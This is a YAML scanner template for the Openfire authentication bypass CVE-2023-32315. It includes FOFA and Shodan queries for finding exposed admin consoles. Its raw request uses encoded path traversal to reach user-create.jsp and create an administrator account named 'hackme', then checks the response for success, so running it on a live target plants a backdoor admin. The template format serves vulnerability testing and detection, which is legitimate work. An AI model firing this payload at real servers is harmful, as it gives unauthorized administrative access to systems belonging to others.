id: CVE-2023-32315-2

info:
  name: Openfire身份认证绕过漏洞
  author: zan8in
  severity: high
  verified: true
  description: |
    FOFA: app="Openfire-管理界面"
    SHODAN: title:"openfire"
  reference:
    - https://mp.weixin.qq.com/s/ww4Gr5aJ3QvCdBYLNCiubA
  tags: openfire,bypass
  created: 2023/09/03

set:
  hostname: request.url.host
rules:
  r0:
    request:
      request:
      raw: |
        GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&username=hackme&name=&email=&password=hackme&passwordConfirm=hackme&isadmin=on&create=Create+User HTTP/1.1
        Host: {{hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
    expression: response.status == 200 && response.body.bcontains(b'Exception:') && response.raw_header.ibcontains(b'JSESSIONID=') && response.raw_header.ibcontains(b'csrf=')
expression: r0()